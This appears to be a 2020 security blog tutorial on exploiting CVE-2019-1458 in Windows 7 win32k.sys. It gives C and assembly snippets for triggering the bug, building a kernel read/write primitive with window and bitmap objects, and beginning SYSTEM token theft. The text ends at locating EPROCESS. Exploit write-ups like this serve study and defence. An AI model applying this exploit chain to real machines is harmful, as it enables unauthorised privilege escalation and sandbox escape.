<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
<title>The WizardOpium LPE: Exploiting CVE-2019-1458 | ByteRaptors</title>
<meta name="generator" content="Jekyll v3.8.7" />
<meta property="og:title" content="The WizardOpium LPE: Exploiting CVE-2019-1458" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="In December Kaspersky published a blog post about a 0day exploit spotted in the wild, CVE-2019-1458." />
<meta property="og:description" content="In December Kaspersky published a blog post about a 0day exploit spotted in the wild, CVE-2019-1458." />
<link rel="canonical" href="/windows/exploitation/2020/06/03/exploitingcve2019-1458.html" />
<meta property="og:url" content="/windows/exploitation/2020/06/03/exploitingcve2019-1458.html" />
<meta property="og:site_name" content="ByteRaptors" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-06-03T05:10:38+00:00" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"The WizardOpium LPE: Exploiting CVE-2019-1458","dateModified":"2020-06-03T05:10:38+00:00","datePublished":"2020-06-03T05:10:38+00:00","url":"/windows/exploitation/2020/06/03/exploitingcve2019-1458.html","mainEntityOfPage":{"@type":"WebPage","@id":"/windows/exploitation/2020/06/03/exploitingcve2019-1458.html"},"description":"In December Kaspersky published a blog post about a 0day exploit spotted in the wild, CVE-2019-1458.","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="ByteRaptors" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">ByteRaptors</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">The WizardOpium LPE: Exploiting CVE-2019-1458</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2020-06-03T05:10:38+00:00" itemprop="datePublished">Jun 3, 2020
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>In December Kaspersky published a blog post about a 0day exploit spotted in the wild, CVE-2019-1458.</p>

<p>The vulnerability is in the win32k.sys driver and can allow an attacker to elevate an application privileges to SYSTEM, potentially causing a sandbox escape.</p>

<p>I highly recommend you to first read <a href="https://github.com/piotrflorczyk/cve-2019-1458_POC">this</a> article which contains a very good description of all the nitty-gritty details of this vulnerability since in this post I will focus only on the exploitation of the vulnerability itself on a Window 7 x64 machine.</p>

<h2 id="why-just-windows-7">Why just Windows 7?</h2>

<p>In my personal opinion, it makes much more sense for a person who is just getting started with Windows Kernel Exploitation to develop the exploit for  Windows 7 instead of dealing with Windows 10 mitigations.</p>

<p>Moreover, since the approach I chose to exploit this vulnerability involves building a Kernel Write What Where primitive to carry out a data-only attack, it will be pretty easy to make this exploit work against a Windows 8.1 machine.</p>

<h2 id="lets-get-started">Let’s get started</h2>

<p>CVE-2019-1458 is an arbitrary kernel pointer dereference vulnerability. In other words, an attacker has the possibility to trigger the dereference of a kernel memory address of his choice.</p>

<p>If you have read the article linked above, you will know this vulnerability has some constraints:</p>

<ul>
  <li>It is possible to trigger the vulnerability only once per system reboot.</li>
  <li>The attacker has no control over the content of the value being assigned to the dereferenced pointer.</li>
</ul>

<p>Let’s start with getting a clear idea of what we have and what we want to achieve: we have the possibility to trigger the dereference of a kernel memory address of our choice and we want to elevate our privileges to SYSTEM, possibly even escaping a  browser sandbox.</p>

<p>But how do we actually achieve this?
Most of modern Windows Kernel Exploitation techniques strive to get a Write What Where kernel primitive (hereinafter WWW Primitive): the ability to arbitrarily read and write to kernel memory.
Usually building a WWW primitive consists in triggering a kernel vulnerability with the goal of corrupting specific Windows Kernel objects fields.</p>

<p>Our journey to successfully exploit this vulnerability can be divided into the following parts:</p>

<ul>
  <li>Understanding the pointer dereference.</li>
  <li>Choosing a suitable kernel structure whose fields we want to corrupt.</li>
  <li>Dealing with KASLR.</li>
  <li>Triggering to vulnerability to corrupt the target structure.</li>
  <li>Building the WWW primitive.</li>
  <li>Leveraging the WWW primitive to elevate privileges.</li>
  <li>Fixing corrupted kernel structure.</li>
</ul>

<h2 id="understanding-the-pointer-dereference">Understanding the pointer dereference</h2>

<p>As already stated before, I highly recommend you to first read the analysis I linked you above before keeping reading this article.
In a nutshell, this vulnerability allows to overwrite the pointer to a structure containing information about the Switch Window by calling the SetWindowLongPtr API.
This pointer will be accessed during the execution of the xxxPaintSwitchWindow and will be dereferenced as you can see in the code below (the pointer is present in the register RDI):</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">sub [rdi + 0x60], EBX
add [rdi + 0x68], EBX
sub [rdi + 0x5C], ECX
add [rdi + 0x64],ECX</code></pre></figure>

<p>Since the pointer to this structure can be deliberately overwritten by an attacker, this code will increment and decrement data pointed at four different offsets starting from the attacker-provided kernel address.</p>

<p>Let’s see in the next section what we can do with this information!</p>

<h2 id="choosing-a-suitable-target-kernel-structure">Choosing a suitable target kernel structure</h2>

<p>Unfortunately, we do not have control over the values that will get assigned to our dereferenced pointer.
For this reason, our best bet would be to leverage this vulnerability to modify a field of a kernel object in such a way that we will be able to trigger an Out of Bound write access to some nearby object to develop a stronger primitive.</p>

<p>The technique I will use has been described by Saif El Sherei and relies on the fact that if an attacker is able to place two tagWND objects in memory one after another and then corrupt the cbwndExtra field of the first tagWND object it will be possible to use the SetWindowLongPtr API on the tagWND whose cbwndExtra field has been corrupted to be able to write to the tagWND object placed next to the corrupted one.</p>

<p>But what is the tagWND?
In a nutshell, the tagWND is a kernel structure which represents a WINDOW object in kernel memory.</p>

<p>You can find a very good description of the tagWND structure <a href="https://www.geoffchappell.com/studies/windows/win32/user32/structs/wnd/index.htm">here </a>.</p>

<p>Let’s have a look at the tagWND on WinDBG:</p>

<div align="center"><img src="/images/tagWND.png" height="300" width="700" /> </div>
<p><br /></p>

<p>The most interesting fields for us will be the <b>strName </b> and the <b> cbwndExtra</b>. For now, let’s focus on the latter, representing the size of the extra memory area allocated after the window instance.</p>

<p>When creating a WINDOW, it is possible to specify the number of extra bytes to allocate after the window instance, as you can see in the code snippet below:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">WNDCLASSEXW</span><span class="o">*</span> <span class="n">testClass</span> <span class="o">=</span> <span class="p">(</span><span class="n">WNDCLASSEXW</span><span class="o">*</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">WNDCLASSEXW</span><span class="p">));</span>
<span class="n">testClass</span><span class="o">-&gt;</span><span class="n">cbSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WNDCLASSEXW</span><span class="p">);</span>
<span class="n">testClass</span><span class="o">-&gt;</span><span class="n">lpfnWndProc</span> <span class="o">=</span> <span class="p">(</span><span class="n">WNDPROC</span><span class="p">)</span><span class="n">DefWindowProcW</span><span class="p">;</span>
<span class="n">testClass</span><span class="o">-&gt;</span><span class="n">lpszClassName</span> <span class="o">=</span> <span class="s">L"TestClass"</span><span class="p">;</span>
<span class="n">testClass</span><span class="o">-&gt;</span><span class="n">cbWndExtra</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
<span class="n">RegisterClassExW</span><span class="p">(</span><span class="n">testClass</span><span class="p">);</span>
<span class="n">CreateWindowExW</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">testClass</span><span class="o">-&gt;</span><span class="n">lpszClassName</span><span class="p">,</span> <span class="s">L"DummyName"</span><span class="p">,</span> <span class="n">WS_OVERLAPPEDWINDOW</span><span class="p">,</span> <span class="n">CW_USEDEFAULT</span><span class="p">,</span> <span class="n">CW_USEDEFAULT</span><span class="p">,</span> <span class="n">CW_USEDEFAULT</span><span class="p">,</span> <span class="n">CW_USEDEFAULT</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span></code></pre></figure>

<p>Running this code will trigger the creation in kernel mode of a tagWND object having 0x1000 as cbwndExtra field value!</p>

<p>Since the SetWindowLongPtr function can be used to set a value at a specified offset in the extra window memory, if we manage to leverage the vulnerability in such a way that the cbwndExtra value of a tagWND object will be much higher than the original one, issuing a call to the SetWindowLongPtr will result in an Out of Bound write, allowing us to further corrupt other kernel structures.</p>

<h2 id="dealing-with-kaslr">Dealing with KASLR</h2>

<p>Considering that we are dealing with an arbitrary pointer dereference, we will not need to perform some magic kernel pool feng-shui to accomplish our goal.
In order to successfully corrupt the <i> cbwndExtra </i> of our target tagWND object we will need to solve just two problems:</p>

<ul>
  <li>Getting the tagWND object kernel address</li>
  <li>Choosing the right offset to trigger the dereference on</li>
</ul>

<h4 id="getting-the-tagwnd-object-kernel-address">Getting the tagWND object kernel address</h4>

<p>To leak the tagWND kernel address we can use the well-known HMValidateHandle technique:  since this function allows to map the tagWND object in the user mode memory space, we will be able to get its kernel mode address and its field values.</p>

<p>This technique is extremely popular in the world of Windows Kernel Exploitation and a lot of words have been spent on it, for more information about this topic just read <a href="https://media.blackhat.com/bh-us-11/Mandt/BH_US_11_Mandt_win32k_WP.pdf">here </a>.</p>

<h4 id="choosing-the-right-offset">Choosing the right offset</h4>

<p>The arbitrary pointer dereference operates on four offsets starting from the attacker-provided address: 0x60, 0x68,0x5C and 0x64.
The small problem that arises is that since our target cbwndExtra field is located at offset 0xE8, we can’t just trigger the vulnerability by providing the tagWND kernel address since the triggered arbitrary dereference will not access offset 0xE8.</p>

<p>Let’s look at the first dereference:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">sub [rdi + 0x60], ebx</code></pre></figure>

<p>Since 0x88 + 0x60 = 0xE8 we can just trigger the vulnerability by providing this address:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">tagWNDKernelAddress + 0x88</code></pre></figure>

<p>In this way, the value of the cbwndExtra field will be decremented and become less than zero, allowing us to get a partial write primitive.</p>

<p>There is still a problem: since it is not the only dereference present, other fields of the tagWND structure will be corrupted, resulting in a BSOD as soon as we close the application.
Since the BSOD will be triggered only after closing the application, we will take care of this issue in the last chapter of our adventure.</p>

<h2 id="triggering-the-vulnerability">Triggering the vulnerability</h2>

<p>We are now ready to trigger the vulnerability!</p>

<p>The process of triggering the vulnerability can be divided into the following parts:</p>

<ul>
  <li>Triggering the creation of two adjacent tagWND objects.</li>
  <li>Creating the target Window and initializing it.</li>
  <li>Setting the pointer we want to trigger the arbitrary dereference on.</li>
  <li>Creating the special Switch Window.</li>
  <li>Simulating the pressing of the ALT keyboard button</li>
  <li>Sending the WM_ERASEBKGND to the target Window</li>
</ul>

<h4 id="triggering-the-creation-of-two-adjacent-tagwnd-objects">Triggering the creation of two adjacent tagWND Objects</h4>

<p>This part is actually not related to the vulnerability itself, but we will need it to successfully exploit the vulnerability.</p>

<p>Since our goal is to trigger the vulnerability to corrupt the cbwndExtra field of a tagWND object,
we will need to make sure that we will create two adjacent tagWND structure since this approach will
give us just a partial write primitive!</p>

<p>To solve this problem, we can just create a lot of Window objects, leak their addresses using the HMValidateHandle technique
and just look at the distance between the created objects to choose the nearest between each other ones.</p>

<p>Once we found two adjacent tagWND object we can continue to the next part.</p>

<h4 id="creating-and-initializing-the-target-window">Creating and initializing the target Window</h4>

<p>We will now need to create the Window object which will be used to trigger the vulnerability.
To accomplish this task, we can just register a Window class with a cbwndExtra field of 0x8 and then use the CreateWindowEx API to create
our target Window.</p>

<p>Then we will just initialize the target window by calling the NtUserMessageCall with the WM_CREATE param.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">NtUserMessageCall</span><span class="p">(</span><span class="n">targetWindow</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xE0</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//0x1 is WM_CREATE</span></code></pre></figure>

<p>But how do we actually call the NtUserMessageCall function?
We will need to issue a syscall! Luckily for us, at <a href="https://github.com/j00ru/windows-syscalls"> this</a> address we can find the list of all Windows syscalls with their number: as we can see, the syscall number for NtUserMessageCall is 0x1007 on Windows 7 x64.</p>

<p>There is still a small problem we will need to solve: since we want to support execution from Wow64 processes, we will need to support Wow64 syscalls as we can see in the snippets below:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">_declspec</span><span class="p">(</span><span class="kr">naked</span><span class="p">)</span> <span class="n">NTSTATUS</span> <span class="n">WINAPI</span> <span class="nf">NtUserMessageCallWow64</span><span class="p">(</span><span class="n">HWND</span><span class="p">,</span> <span class="n">UINT</span><span class="p">,</span> <span class="n">WPARAM</span><span class="p">,</span> <span class="n">LPARAM</span><span class="p">,</span> <span class="n">ULONG_PTR</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">,</span> <span class="n">BOOL</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">_asm</span><span class="p">{</span>
		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x1007</span><span class="p">;</span>
		<span class="n">xor</span> <span class="n">ecx</span><span class="p">,</span><span class="n">ecx</span><span class="p">;</span>
		<span class="n">lea</span> <span class="n">edx</span><span class="p">,</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="n">ss</span><span class="o">:</span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">];</span>
		<span class="n">call</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mh">0xC0</span><span class="p">];</span>
		<span class="n">add</span> <span class="n">esp</span><span class="p">,</span><span class="mh">0x4</span><span class="p">;</span>
		<span class="n">retn</span> <span class="mh">0x1C</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">PUBLIC NtUserMessageCall
NtUserMessageCall PROC
    mov r10, rcx
    mov eax,0x1007
    syscall
    ret
NtUserMessageCall ENDP</code></pre></figure>

<h4 id="setting-the-pointer-we-want-to-trigger-the-arbitrary-dereference-on">Setting the pointer we want to trigger the arbitrary dereference on</h4>

<p>It’s now time to call the SetWindowLongPtr on the target Window specifying the address of the first of the two created adjacent
tagWND objects as already explained before.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">SetWindowLongPtr</span><span class="p">(</span><span class="n">targetWindow</span><span class="p">,</span><span class="mi">0</span><span class="p">,(</span><span class="n">ULONG</span><span class="p">)(</span><span class="n">tagWNDKernelAddress</span> <span class="o">+</span> <span class="mh">0x88</span><span class="p">));</span>
<span class="n">SetWindowLongPtr</span><span class="p">(</span><span class="n">targetWindow</span><span class="p">,</span><span class="mi">4</span><span class="p">,(</span><span class="n">ULONG</span><span class="p">)(</span><span class="n">tagWNDKernelAddress</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">));</span></code></pre></figure>

<p>In this way the offset 0x88 of the tagWNDKernelAddress will be dereferenced in the xxxPaintSwitchWindow function after sending the WM_ERASEBKGND message as we will see in the next sections.</p>

<p>If we pay attention to the code above, we will notice that the SetWindowLongPtr function is actually called two times: this approach is used to support execution from Wow64 processes since it will not be possible to set a ULONG64 address by calling the SetWindowLongPtr function just once from a 32 bit process.</p>

<h4 id="creating-the-special-switch-window">Creating the special Switch Window</h4>

<p>Creating this Window will be crucial to execute the code path to trigger the vulnerability as you can read in the detailed
analysis of the vulnerability I linked above.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">HMODULE</span> <span class="n">currMod</span> <span class="o">=</span> <span class="n">GetModuleHandleA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
<span class="n">HWND</span> <span class="n">taskSwitchWnd</span> <span class="o">=</span> <span class="n">CreateWindowExA</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"#32771"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">currMod</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span></code></pre></figure>

<h4 id="simulating-the-pressing-of-the-alt-keyboard-button">Simulating the pressing of the ALT keyboard button</h4>

<p>To trigger the vulnerability, we will need to simulate the pressing of the ALT keyboard button.
Let’s take a better look at the pseudo C code checking for the status of the ALT button:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">arbitraryKernelAddress</span> <span class="o">+</span> <span class="mh">0x6C</span><span class="p">)))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
	<span class="k">if</span><span class="p">(</span><span class="n">GetAsyncKeyState</span><span class="p">(</span><span class="n">VK_MENU</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="k">goto</span> <span class="n">fail</span>
<span class="p">}</span>
<span class="k">else</span><span class="p">{</span>
	<span class="k">if</span><span class="p">(</span><span class="n">GetKeyState</span><span class="p">(</span><span class="n">VK_MENU</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="k">goto</span> <span class="n">fail</span>
<span class="p">}</span></code></pre></figure>

<p>The function will compare to zero a DWORD value located at the offset 0x6C starting from the attacker-provided kernel address and will determine according
to the comparison result which function to use to get the status of the ALT button.
What are the differences between the GetAsyncKeyState and GetKeyState functions?</p>

<p>The GetKeyState function will get the key status returned from the thread’s message queue, while the GetAsyncKeyState will determine whether
the key was pressed since the last call to GetAsyncKeyState.</p>

<p>Since we decided to provide the address of our target tagWND structure + 0x88, the vulnerable function will check the DWORD at offset
0xF0 (0x88 + 0x6C) of the target tagWND address.</p>

<p>The DWORD at address 0xF0 will contain the lowest 32 bits of the <i>spwndLastActive </i> field of the target tagWND object.</p>

<p>Since we can get a read-only copy of the tagWND object by calling the HMValidateHandle function, we can just check the value of the DWORD at the offset 0xF0
to determine how to simulate the pressing of the ALT button.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">tagWNDUsermodeCopy</span> <span class="o">+</span> <span class="mh">0xF0</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
	<span class="n">INPUT</span> <span class="n">inputData</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
	<span class="n">inputData</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">INPUT_KEYBOARD</span><span class="p">;</span>
	<span class="n">inputData</span><span class="p">.</span><span class="n">ki</span><span class="p">.</span><span class="n">wVk</span> <span class="o">=</span> <span class="n">VK_MENU</span><span class="p">;</span>
	<span class="n">inputData</span><span class="p">.</span><span class="n">ki</span><span class="p">.</span><span class="n">dwFlags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="n">SendInput</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">inputData</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">inputData</span><span class="p">));</span>

<span class="p">}</span>
<span class="k">else</span><span class="p">{</span>
	<span class="n">BYTE</span> <span class="n">keyState</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
	<span class="n">GetKeyboardState</span><span class="p">(</span><span class="n">keyState</span><span class="p">);</span>
	<span class="n">keyState</span><span class="p">[</span><span class="n">VK_MENU</span><span class="p">]</span> <span class="o">|=</span> <span class="mh">0x80</span><span class="p">;</span>
	<span class="n">SetKeyboardState</span><span class="p">(</span><span class="n">keyState</span><span class="p">);</span>

<span class="p">}</span></code></pre></figure>

<h4 id="sending-the-wm_erasebkgnd-to-the-target-window">Sending the WM_ERASEBKGND to the target Window</h4>

<p>So here we are! We will now send the WM_ERASEBKGND message to the target Window by calling the NtUserMessageCall API.
Sending this message will trigger the execution of the xxxPaintSwitchWindow on the vulnerable code path where the arbitrary pointer dereference occurs!</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">NtUserMessageCall</span><span class="p">(</span><span class="n">targetWindow</span><span class="p">,</span><span class="mh">0x14</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xE0</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//0x14 is WM_ERASEBKGND</span></code></pre></figure>

<p>Let’s take a look at our target tagWND object before sending the WM_ERASEBKGND message:</p>

<div align="center"><img src="/images/tagWNDBefore1.png" height="300" width="700" /> </div>
<p><br /></p>

<div align="center"><img src="/images/tagWNDBefore2.png" height="200" width="700" /> </div>
<p><br /></p>

<p>If we pay attention to the pictures above, we will see that the value of the cbwndExtra field is 0x3000 (12288 in decimal).</p>

<p>Let’s now have a look at the very same kernel address after sending the WM_ERASEBKGND message:</p>

<div align="center"><img src="/images/tagWNDAfter1.png" height="300" width="700" /> </div>
<p><br /></p>

<div align="center"><img src="/images/tagWNDAfter2.png" height="200" width="700" /> </div>
<p><br /></p>

<p>The value of the cbwndExtra has become much bigger than the original one!
As already stated before, by corrupting the cbwndExtra field of a tagWND object we will be able to turn a call to the SetWindowLongPtr API into a partial kernel write primitive.</p>

<p>We will now see in the next section how to turn this partial write primitive into something more powerful.</p>

<h2 id="building-the-www-primitive">Building the WWW Primitive</h2>

<p>The cbwndExtra of our corrupted tagWND is now very big. What does this imply?
By issuing a call to the SetWindowLongPtr API and specifying the HWND of our corrupted tagWND object we will be able to  trigger an Out-of-Bound write and write across the extra memory of our tagWND object.</p>

<p>The only thing that we must take into account is that we will need to calculate the distance between the beginning of our corrupted tagWND extra memory and the field of the adjacent tagWND structure we want to corrupt!
A nice write-up of this technique can be found <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/one-bit-rule-system-analyzing-cve-2016-7255-exploit-wild/"> here </a></p>

<p>Moreover, before keeping reading I strongly recommend you to first read <a href="https://www.coresecurity.com/core-labs/articles/abusing-gdi-for-ring0-exploit-primitives">this</a> article  if you are not familiar with using BITMAP objects to build WWW primitives.</p>

<p>Our plan to build our WWW primitive will look like this:</p>

<ul>
  <li>Create two BITMAP objects (Manager and Worker) and leak their kernel addresses.</li>
  <li>Use our partial write primitive to set the strName field of the adjacent tagWND object to the address of our Manager BITMAP.</li>
  <li>Call the SetWindowText on the adjacent tagWND object by setting the window text as the address of the Worker BITMAP.</li>
</ul>

<h4 id="creating-two-bitmap-objects-and-leaking-their-addresses">Creating two BITMAP Objects and leaking their addresses</h4>

<p>Considering the fact that we are exploiting this vulnerability on a Windows 7 x64 machine, creating BITMAP objects and leaking their addresses will be pretty trivial since it can be accomplished by just accessing the GdiSharedHandleTable.</p>

<p>For more information about this topic, just read the CoreSecurity article I linked above.</p>

<h4 id="corrupting-the-strname-field">Corrupting the strName field</h4>

<p>The strName field of a tagWND object is a LARGE_UNICODE_STRING structure containing a pointer to a buffer in which it is stored the name of the Window object.</p>

<p>This is the buffer the function NtUserDefSetText will ultimately operate on. In other words, if we are able to modify the address contained in the strName.Buffer field of a tagWND object, the NtUserDefSetText function will write data to the specified address!</p>

<p>Technically we could build a full Write What Where primitive just by leveraging NtUserDefSetText for the write primitive and InternalGetWindowText for the read primitive but since I wanted to show you how to build a WWW primitive by abusing GDI objects, let’s use the SetWindowLongPtr function to overwrite the strName.Buffer field of the adjacent tagWND object with the address of the pvScan0 field of our Manager Bitmap object.</p>

<p>To corrupt the strName field of our target adjacent object, we will just need to call the SetWindowLongPtr API with the HWND of the corrupted tagWND object and the right offset as already explained above.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">SetWindowLongPtr</span><span class="p">(</span><span class="n">corruptedWindowHWND</span><span class="p">,</span><span class="n">offsetDelta</span><span class="p">,(</span><span class="n">ULONG</span><span class="p">)(</span><span class="n">pManagerBitmapAddress</span><span class="p">));</span>
<span class="n">SetWindowLongPtr</span><span class="p">(</span><span class="n">corruptedWindowHWND</span><span class="p">,</span><span class="n">offsetDelta</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">,(</span><span class="n">ULONG</span><span class="p">)(</span><span class="n">pManagerBitmapAddress</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">));</span></code></pre></figure>

<h4 id="modifying-the-manager-object-pvscan0-field">Modifying the Manager Object pvscan0 field</h4>

<p>Since the strName.Buffer field of the adjacent tagWND object is set to the address of the pvscan0 field of the Manager object, we will now call the SetWindowTextW API to actually overwrite the value of the Manager’s pvscan0 field.</p>

<p>By specifying the address of the Worker Bitmap object as shown in the code below, the pvScan0 field of the Manager BITMAP will have the value of the address
of the pvscan0 address of the Worker Bitmap. In other words, we will be then able to arbitrarily read and write the kernel memory by calling the GetBitmapBits/SetBitmapBits APIs on the corrupted BITMAP objects!</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">wchar_t</span><span class="o">*</span> <span class="n">inputText</span> <span class="o">=</span> <span class="p">(</span><span class="kt">wchar_t</span><span class="o">*</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="mi">5</span><span class="o">*</span><span class="nf">sizeof</span><span class="p">(</span><span class="kt">wchar_t</span><span class="p">));</span>

<span class="n">inputText</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">pWorkerBitmapAddress</span> <span class="o">&gt;&gt;</span> <span class="mi">48</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span><span class="p">;</span>
<span class="n">inputText</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">pWorkerBitmapAddress</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span><span class="p">;</span>
<span class="n">inputText</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">pWorkerBitmapAddress</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span><span class="p">;</span>
<span class="n">inputText</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">pWorkerBitmapAddress</span> <span class="o">&gt;&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span><span class="p">;</span>

<span class="n">SetWindowTextW</span><span class="p">(</span><span class="n">adjacentWindowHwnd</span><span class="p">,</span> <span class="p">(</span><span class="n">LPWSTR</span><span class="p">)</span><span class="n">inputText</span><span class="p">);</span></code></pre></figure>

<p>Congratulations! We have built a full WWW primitive which will allow us to read and write to any address in kernel memory!</p>

<h2 id="elevating-privileges">Elevating privileges</h2>

<p>Once we have a full WWW primitive, there are a lot of ways to elevate our privileges. In this article, we will focus on one of the most common approaches: stealing the SYSTEM TOKEN.</p>

<p>Every process running on the system is represented in kernel memory in a EPROCESS structure which describes several properties of the process, such as its process image name and process security context.</p>

<p>One of the EPROCESS structure most interesting fields is the TOKEN structure: a kernel memory structure describing the process token privileges.</p>

<p>A common strategy used when exploiting a Windows Kernel vulnerability is to replace the TOKEN of the process in which the exploit code will we executed with the TOKEN of the SYSTEM process.
The replacing of our process TOKEN with the SYSTEM’s token will give us SYSTEM privileges on the targeted machine, allowing us to successfully escape the browser sandbox!
Sounds good, right?</p>

<p>Since we have already built our WWW primitive, we will just need to understand how to get the kernel address of the SYSTEM EPROCESS structure and the kernel address of our process EPROCESS structure.</p>

<h4 id="getting-eprocess-address">Getting EPROCESS address</h4>

<p>A very common approach to get the address to the System EPROCESS structure is to get the offset to the PsInitialSystemProcess variable by loading in memory the ntoskrnl.exe executable and then getting the kernel address of ntoskrnl.exe by calling the EnumDeviceDrivers function.</p>

